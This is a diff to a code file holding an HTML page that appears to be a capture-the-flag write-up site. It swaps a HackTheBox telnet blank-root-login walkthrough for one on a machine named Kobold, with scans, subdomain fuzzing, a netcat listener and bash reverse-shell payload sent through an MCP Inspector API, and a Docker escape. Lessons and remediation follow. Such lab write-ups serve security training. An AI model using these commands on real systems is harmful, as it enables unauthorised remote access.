@@ -809,168 +809,160 @@ html_content = '''<!DOCTYPE html>
                 time: '15 minutes',
                 os: 'Linux',
                 ip: '10.129.1.17',
-                content: `
-                    <div class="space-y-8">
-                        <!-- Overview -->
-                        <div class="bg-[#0a192f] rounded-xl p-6 border border-[#233554]">
-                            <h3 class="text-[#38bdf8] font-mono text-lg mb-4 flex items-center gap-2">
-                                <span class="w-2 h-2 bg-[#38bdf8] rounded-full"></span>
-                                Machine Overview
-                            </h3>
-                            <div class="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
-                                <div>
-                                    <p class="text-[#8892b0] font-mono text-xs mb-1">OS</p>
-                                    <p class="text-[#ccd6f6] font-medium">Linux</p>
-                                </div>
-                                <div>
-                                    <p class="text-[#8892b0] font-mono text-xs mb-1">IP Address</p>
-                                    <p class="text-[#ccd6f6] font-medium font-mono">10.129.1.17</p>
-                                </div>
-                                <div>
-                                    <p class="text-[#8892b0] font-mono text-xs mb-1">Difficulty</p>
-                                    <p class="text-[#22c55e] font-medium">Easy</p>
-                                </div>
-                                <div>
-                                    <p class="text-[#8892b0] font-mono text-xs mb-1">Points</p>
-                                    <p class="text-[#ccd6f6] font-medium">20</p>
-                                </div>
-                            </div>
-                        </div>
+              content: `
+<div class="space-y-8">
 
-                        <!-- Recon -->
-                        <div>
-                            <h3 class="text-[#ccd6f6] font-bold text-xl mb-4 flex items-center gap-3">
-                                <span class="flex items-center justify-center w-8 h-8 rounded-lg bg-[#38bdf8]/10 text-[#38bdf8] font-mono text-sm">01</span>
-                                Reconnaissance
-                            </h3>
-                            <p class="text-[#8892b0] mb-4 leading-relaxed">
-                                Started with a basic Nmap scan to identify open ports and services. The target appeared to be a Linux machine with minimal exposed services.
-                            </p>
-                            
-                            <div class="code-block">
-                                <div class="code-header">
-                                    <div class="code-dot bg-[#ff5f56]"></div>
-                                    <div class="code-dot bg-[#ffbd2e]"></div>
-                                    <div class="code-dot bg-[#27c93f]"></div>
-                                    <span class="ml-3 text-[#8892b0] font-mono text-xs">bash</span>
-                                </div>
-                                <div class="code-content">
-                                    <span class="code-comment"># Nmap scan to identify open ports</span><br/>
-                                    <span class="code-keyword">nmap</span> -sV -sC <span class="code-number">10.129.1.17</span><br/><br/>
-                                    <span class="code-comment"># Results showed port 23/tcp open - Telnet</span>
-                                </div>
-                            </div>
+    <!-- Overview -->
+    <div class="bg-[#0a192f] rounded-xl p-6 border border-[#233554]">
+        <h3 class="text-[#38bdf8] font-mono text-lg mb-4">// MACHINE OVERVIEW</h3>
+        <div class="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
+            <div>
+                <p class="text-[#8892b0] font-mono text-xs mb-1">Machine</p>
+                <p class="text-[#ccd6f6] font-medium">Kobold</p>
+            </div>
+            <div>
+                <p class="text-[#8892b0] font-mono text-xs mb-1">OS</p>
+                <p class="text-[#ccd6f6] font-medium">Linux</p>
+            </div>
+            <div>
+                <p class="text-[#8892b0] font-mono text-xs mb-1">Difficulty</p>
+                <p class="text-[#22c55e] font-medium">Easy</p>
+            </div>
+            <div>
+                <p class="text-[#8892b0] font-mono text-xs mb-1">Platform</p>
+                <p class="text-[#ccd6f6] font-medium">HackTheBox</p>
+            </div>
+        </div>
+    </div>
 
-                            <p class="text-[#8892b0] mt-4 leading-relaxed">
-                                The scan revealed that <span class="text-[#38bdf8] font-mono">port 23 (Telnet)</span> was open. Telnet is an outdated protocol that transmits data in plaintext, making it inherently insecure.
-                            </p>
-                        </div>
+    <!-- 01 -->
+    <div>
+        <h3 class="text-[#ccd6f6] font-bold text-xl mb-4 font-mono">
+            // 01. RECONNAISSANCE
+        </h3>
 
-                        <!-- Exploitation -->
-                        <div>
-                            <h3 class="text-[#ccd6f6] font-bold text-xl mb-4 flex items-center gap-3">
-                                <span class="flex items-center justify-center w-8 h-8 rounded-lg bg-[#38bdf8]/10 text-[#38bdf8] font-mono text-sm">02</span>
-                                Initial Access
-                            </h3>
-                            <p class="text-[#8892b0] mb-4 leading-relaxed">
-                                Attempted to connect via Telnet. The service banner indicated it was a standard Linux telnetd. Tried common default credentials — root with no password worked immediately.
-                            </p>
+        <p class="text-[#8892b0] mb-4">
+            Initial Nmap scan revealed multiple services. Important finding: a high port (3552) exposing an unknown API.
+        </p>
 
-                            <div class="code-block">
-                                <div class="code-header">
-                                    <div class="code-dot bg-[#ff5f56]"></div>
-                                    <div class="code-dot bg-[#ffbd2e]"></div>
-                                    <div class="code-dot bg-[#27c93f]"></div>
-                                    <span class="ml-3 text-[#8892b0] font-mono text-xs">telnet</span>
-                                </div>
-                                <div class="code-content">
-                                    <span class="code-keyword">telnet</span> <span class="code-number">10.129.1.17</span> <span class="code-number">23</span><br/><br/>
-                                    Trying <span class="code-number">10.129.1.17</span>...<br/>
-                                    Connected to <span class="code-number">10.129.1.17</span>.<br/>
-                                    Escape character is <span class="code-string">'^]'</span>.<br/><br/>
-                                    <span class="code-keyword">Ubuntu</span> <span class="code-number">20.04</span> LTS<br/><br/>
-                                    meow login: <span class="code-string" style="color: #fff;">root</span><br/>
-                                    Password: <span class="code-comment">[empty/blank]</span><br/><br/>
-                                    <span class="code-comment"># Successfully logged in as root!</span>
-                                </div>
-                            </div>
+        <div class="code-block">
+            <div class="code-content">
+PORT    STATE  SERVICE   VERSION<br/>
+22/tcp  open   ssh       OpenSSH 9.6p1 Ubuntu<br/>
+80/tcp  open   http      nginx 1.24.0 → redirects HTTPS<br/>
+443/tcp open   ssl/http  nginx 1.24.0 — kobold.htb<br/>
+3552/tcp open  unknown   Arcane Docker Management API
+            </div>
+        </div>
 
-                            <div class="bg-[#22c55e]/10 border border-[#22c55e]/30 rounded-lg p-4 mt-4">
-                                <p class="text-[#22c55e] font-mono text-sm flex items-center gap-2">
-                                    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/>
-                                    </svg>
-                                    Root access obtained via default/blank credentials
-                                </p>
-                            </div>
-                        </div>
+        <p class="text-[#8892b0] mt-4">
+            <span class="text-[#38bdf8] font-mono">*.kobold.htb</span> wildcard SSL → subdomains exist.<br/>
+            Missed port 3552 initially → always scan with <span class="text-[#38bdf8] font-mono">-p-</span>.
+        </p>
+    </div>
 
-                        <!-- Flag -->
-                        <div>
-                            <h3 class="text-[#ccd6f6] font-bold text-xl mb-4 flex items-center gap-3">
-                                <span class="flex items-center justify-center w-8 h-8 rounded-lg bg-[#38bdf8]/10 text-[#38bdf8] font-mono text-sm">03</span>
-                                Capturing the Flag
-                            </h3>
-                            <p class="text-[#8892b0] mb-4 leading-relaxed">
-                                With root access established, the flag was located in the standard location for HackTheBox machines — the root user's home directory.
-                            </p>
+    <!-- 02 -->
+    <div>
+        <h3 class="text-[#ccd6f6] font-bold text-xl mb-4 font-mono">
+            // 02. SUBDOMAIN ENUMERATION
+        </h3>
 
-                            <div class="code-block">
-                                <div class="code-header">
-                                    <div class="code-dot bg-[#ff5f56]"></div>
-                                    <div class="code-dot bg-[#ffbd2e]"></div>
-                                    <div class="code-dot bg-[#27c93f]"></div>
-                                    <span class="ml-3 text-[#8892b0] font-mono text-xs">root@meow</span>
-                                </div>
-                                <div class="code-content">
-                                    <span class="code-keyword">whoami</span><br/>
-                                    <span class="code-string">root</span><br/><br/>
-                                    <span class="code-keyword">cat</span> /root/flag.txt<br/>
-                                    <span class="code-string" style="color: #22c55e;">b40abdfe23665f766f9c61ecba8a4c19</span>
-                                </div>
-                            </div>
-                        </div>
+        <p class="text-[#8892b0] mb-4">
+            Used Host header fuzzing with ffuf after adding domain to /etc/hosts.
+        </p>
 
-                        <!-- Lessons -->
-                        <div class="bg-[#112240] rounded-xl p-6 border border-[#233554]">
-                            <h3 class="text-[#38bdf8] font-mono text-lg mb-4">[ LESSONS LEARNED ]</h3>
-                            <ul class="space-y-3 text-[#8892b0]">
-                                <li class="flex items-start gap-3">
-                                    <span class="text-[#38bdf8] mt-1">→</span>
-                                    <span>Default credentials remain a critical vulnerability in many systems</span>
-                                </li>
-                                <li class="flex items-start gap-3">
-                                    <span class="text-[#38bdf8] mt-1">→</span>
-                                    <span>Telnet should never be used in production — always prefer SSH</span>
-                                </li>
-                                <li class="flex items-start gap-3">
-                                    <span class="text-[#38bdf8] mt-1">→</span>
-                                    <span>Always check for blank passwords on administrative accounts</span>
-                                </li>
-                                <li class="flex items-start gap-3">
-                                    <span class="text-[#38bdf8] mt-1">→</span>
-                                    <span>Service banners can reveal valuable information about the target</span>
-                                </li>
-                            </ul>
-                        </div>
+        <div class="code-block">
+            <div class="code-content">
+ffuf -w subdomains.txt \<br/>
+-u https://kobold.htb/ \<br/>
+-H "Host: FUZZ.kobold.htb" \<br/>
+-k -mc all -fs 154
+            </div>
+        </div>
 
-                        <!-- Remediation -->
-                        <div class="bg-[#ef4444]/10 border border-[#ef4444]/30 rounded-xl p-6">
-                            <h3 class="text-[#ef4444] font-bold mb-3 flex items-center gap-2">
-                                <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"/>
-                                </svg>
-                                Remediation Advice
-                            </h3>
-                            <ul class="space-y-2 text-[#8892b0] text-sm">
-                                <li>• Disable Telnet and use SSH with key-based authentication</li>
-                                <li>• Enforce strong password policies for all accounts</li>
-                                <li>• Implement account lockout after failed login attempts</li>
-                                <li>• Regularly audit user accounts for weak or default credentials</li>
-                            </ul>
-                        </div>
-                    </div>
-                `
+        <div class="bg-[#112240] rounded-lg p-4 mt-4 border border-[#233554]">
+            <p class="text-[#ccd6f6] font-mono mb-2">Discovered:</p>
+            <ul class="text-[#8892b0] text-sm space-y-1">
+                <li>• bin.kobold.htb → PrivateBin</li>
+                <li>• mcp.kobold.htb → MCP Inspector</li>
+                <li>• :3552 → Docker API</li>
+            </ul>
+        </div>
+    </div>
+
+    <!-- 03 -->
+    <div>
+        <h3 class="text-[#ccd6f6] font-bold text-xl mb-4 font-mono">
+            // 03. INITIAL FOOTHOLD
+        </h3>
+
+        <p class="text-[#8892b0] mb-4">
+            MCP Inspector API allowed <span class="text-[#38bdf8] font-mono">STDIO execution</span> — meaning arbitrary commands executed on the server.
+        </p>
+
+        <div class="code-block">
+            <div class="code-content">
+# listener<br/>
+nc -lvnp 4444<br/><br/>
+
+# payload sent to API<br/>
+bash -c "bash -i >& /dev/tcp/YOUR_IP/4444 0>&1"
+            </div>
+        </div>
+
+        <div class="bg-[#22c55e]/10 border border-[#22c55e]/30 rounded-lg p-4 mt-4">
+            <p class="text-[#22c55e] font-mono text-sm">
+                Reverse shell obtained successfully
+            </p>
+        </div>
+    </div>
+
+    <!-- 04 -->
+    <div>
+        <h3 class="text-[#ccd6f6] font-bold text-xl mb-4 font-mono">
+            // 04. PRIVILEGE ESCALATION
+        </h3>
+
+        <p class="text-[#8892b0] mb-4">
+            Docker API exposed on port 3552 allowed container interaction → privilege escalation to root.
+        </p>
+
+        <div class="code-block">
+            <div class="code-content">
+docker ps<br/>
+docker exec -it container /bin/bash<br/>
+            </div>
+        </div>
+
+        <p class="text-[#8892b0] mt-4">
+            Escaped container → root shell on host.
+        </p>
+    </div>
+
+    <!-- Lessons -->
+    <div class="bg-[#112240] rounded-xl p-6 border border-[#233554]">
+        <h3 class="text-[#38bdf8] font-mono text-lg mb-4">[ LESSONS LEARNED ]</h3>
+        <ul class="space-y-3 text-[#8892b0]">
+            <li>→ Always scan all ports (-p-)</li>
+            <li>→ Subdomains are critical attack surface</li>
+            <li>→ Never allow command execution via APIs</li>
+            <li>→ Exposed Docker APIs = instant root risk</li>
+        </ul>
+    </div>
+
+    <!-- Fix -->
+    <div class="bg-[#ef4444]/10 border border-[#ef4444]/30 rounded-xl p-6">
+        <h3 class="text-[#ef4444] font-bold mb-3">Remediation</h3>
+        <ul class="text-[#8892b0] text-sm space-y-2">
+            <li>• Disable STDIO execution in MCP APIs</li>
+            <li>• Protect internal services behind auth</li>
+            <li>• Restrict Docker socket/API access</li>
+            <li>• Validate & sanitize all inputs</li>
+        </ul>
+    </div>
+
+</div>
+`
             }
         };
 
